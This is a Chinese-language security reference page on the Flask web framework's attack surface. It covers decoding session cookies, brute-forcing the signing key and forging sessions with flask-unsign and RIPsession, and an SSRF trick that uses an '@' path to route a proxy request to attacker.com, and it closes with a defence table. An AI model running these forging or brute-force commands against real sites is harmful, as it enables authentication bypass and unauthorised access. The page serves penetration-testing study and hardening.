---
attack_surface:
  - 配置缺陷
  - 认证/授权绕过
  - 注入类
impact:
  - 身份伪造
  - 信息泄露
  - 远程代码执行
risk_level: 中
prerequisites:
  - Flask Web 框架基础
  - HTTP Session 与 Cookie 概念
  - Jinja2 模板引擎基础
related_techniques:
  - ssti
  - ssrf
  - sqli
  - werkzeug-debug-rce
  - python-sandbox-bypass
difficulty: 初级
tools:
  - flask-unsign
  - ripsession
  - sqlmap
---

# Flask — Flask Web Framework Attack Surface — Flask Web 框架攻击面

> 关联文档：[Werkzeug Debug Exposure](../Werkzeug%20Debug%20Exposure/README.md) · [SSTI](../../User%20input/Reflected%20Values/SSTI/README.md) · [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md) · [SQL Injection](../../User%20input/Search/SQL%20Injection/README.md) · [Python Sandbox Bypass](../../../hacktricks/generic-methodologies-and-resources/python/bypass-python-sandboxes/README.md)

---

### 知识路径

```
Flask Security（本文档）
  ├── 前置知识：Flask Web 框架 — route、session、Jinja2 模板
  ├── 前置知识：HTTP Cookies — 签名、序列化、Base64
  ├── 进阶：Flask Session Cookie 伪造 → 认证绕过
  │   └── 工具：flask-unsign、ripsession
  ├── 进阶：Flask Proxy SSRF — @ 前缀路径解析混淆
  ├── 关联：SSTI — Flask + Jinja2 模板注入（CTF 高频）
  │   └── 参见：User input/Reflected Values/SSTI
  ├── 关联：Werkzeug Debug Exposure — Flask 底层调试端点攻击
  │   └── 参见：Web Servers & Middleware/Werkzeug Debug Exposure
  ├── 关联：SQL Injection — SQLmap eval 自动签名 Flask Cookie
  │   └── 参见：User input/Search/SQL Injection
  └── 关联：Python Sandbox Bypass
      └── 参见：generic-methodologies-and-resources/python/bypass-python-sandboxes
```

---

# 0x01 Flask 攻击面 — 原理与分类

## 1.1 概述

Flask 是 Python 生态中最流行的轻量级 Web 框架，基于 Werkzeug WSGI 工具库和 Jinja2 模板引擎。其攻击面集中在三个层面：

| 层次 | 组件 | 攻击向量 |
|------|------|---------|
| Session 管理 | Flask Session Cookie | 签名密钥爆破 → Cookie 伪造 → 认证绕过 |
| 路由解析 | Flask URL 路由 | `@` 前缀路径解析混淆 → SSRF |
| 模板渲染 | Jinja2 | 服务端模板注入（SSTI）→ RCE |
| 调试端点 | Werkzeug Debugger | `/console` RCE（详见 Werkzeug Debug Exposure） |

**默认 Cookie session 名称为 `session`**。在 CTF 场景中，Flask 应用大概率与 [SSTI](../../User%20input/Reflected%20Values/SSTI/README.md)（服务端模板注入）相关。

---

# 0x02 Session Cookie 攻击

## 2.1 Cookie 结构与解码

Flask session cookie 由三部分组成，以 `.` 分隔：`payload.timestamp.signature`。payload 部分为 Base64 编码的序列化数据。

### 2.1.1 在线解码

使用在线工具解码：[https://www.kirsle.net/wizards/flask-session.cgi](https://www.kirsle.net/wizards/flask-session.cgi)

### 2.1.2 手动解码

取 Cookie 中第一个 `.` 之前的部分进行 Base64 解码：

```bash
echo "ImhlbGxvIg" | base64 -d
```

Cookie 使用密钥进行签名保护。如果密钥泄露或被爆破，可伪造任意 session 数据。

## 2.2 flask-unsign

[flask-unsign](https://pypi.org/project/flask-unsign/) 是一个命令行工具，用于获取、解码、爆破和构造 Flask 应用的 session cookie。

```bash
pip3 install flask-unsign
```

### 2.2.1 解码 Cookie

```bash
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```

### 2.2.2 爆破密钥

```bash
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie '<cookie>' --no-literal-eval
```

### 2.2.3 签名（伪造 Session）

```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'
```

### 2.2.4 旧版本兼容签名

```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME' --legacy
```

## 2.3 RIPsession

[RIPsession](https://github.com/Tagvi/ripsession) 是一个命令行工具，使用 flask-unsign 生成的 Cookie 对目标网站进行爆破：

```bash
  ripsession -u 10.10.11.100 -c "{'logged_in': True, 'username': 'changeMe'}" -s password123 -f "user doesn't exist" -w wordlist.txt
```

参数说明：
- `-u`：目标 URL
- `-c`：成功登录时应显示的 Cookie 内容
- `-s`：已知的 Flask secret key
- `-f`：登录失败时的响应特征字符串
- `-w`：用户名字典

## 2.4 SQLmap 集成 — Flask Session 中的 SQLi

如果已知 Flask secret key，可使用 SQLmap 的 `eval` 选项自动签名 payload。参见 [SQLmap eval 示例](../../User%20input/Search/SQL%20Injection/README.md) 了解详细用法。

---

# 0x03 Flask Proxy SSRF

## 3.1 机制

Flask 的 URL 路由解析器允许请求以 `@` 字符开头，这在以下代理模式中可导致 SSRF：

```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com/'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def proxy(path):
  return get(f'{SITE_NAME}{path}').content

app.run(host='0.0.0.0', port=8080)
```

### 3.2 利用

```http
GET @/ HTTP/1.1
Host: target.com
Connection: close
```

Flask 将 `@/` 解析为路径 `/` 的一部分。当 `path` 变量为 `@attacker.com` 时，`requests.get()` 中的 URL 拼接结果为 `https://google.com/@attacker.com` — requests 库将 `@` 前的部分解释为 `userinfo`，`@` 后的部分为实际 host，从而将请求路由到攻击者控制的服务器。

## 3.3 条件

- Flask 应用使用 `requests.get()` 或类似函数进行 HTTP 代理
- URL 路径直接拼接到目标 URL 末尾（如 `f'{SITE_NAME}{path}'`）
- `SITE_NAME` 不包含路径部分（如 `https://google.com/` — 尾部有 `/`）

> **参见**：[rafa.hashnode.dev — Exploiting HTTP Parsers Inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)

---

# 0x04 防御

| 措施 | 理由 |
|------|------|
| 使用强随机 `SECRET_KEY`（至少 32 字节，从 `os.urandom(32)` 生成） | 防止 session cookie 被爆破 |
| 绝不在 session cookie 中存储敏感数据 | 即使密钥泄露，敏感信息不直接暴露 |
| 在代理场景中，对 `path` 参数进行白名单验证或使用 `urljoin` 正确拼接 | 防止 `@` 前缀 SSRF |
| 生产环境禁用 Flask debug 模式（`debug=False`） | 防止 Werkzeug Console RCE |
| 更新 Flask 和 Werkzeug 到最新版本 | 安全修复 |

## 参考资料

- [Flask Session Cookie Decoder — kirsle.net](https://www.kirsle.net/wizards/flask-session.cgi)
- [flask-unsign — PyPI](https://pypi.org/project/flask-unsign/)
- [RIPsession — GitHub](https://github.com/Tagvi/ripsession)
- [Exploiting HTTP Parsers Inconsistencies — Flask SSRF](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [Flask 官方文档 — Sessions](https://flask.palletsprojects.com/en/stable/quickstart/#sessions)
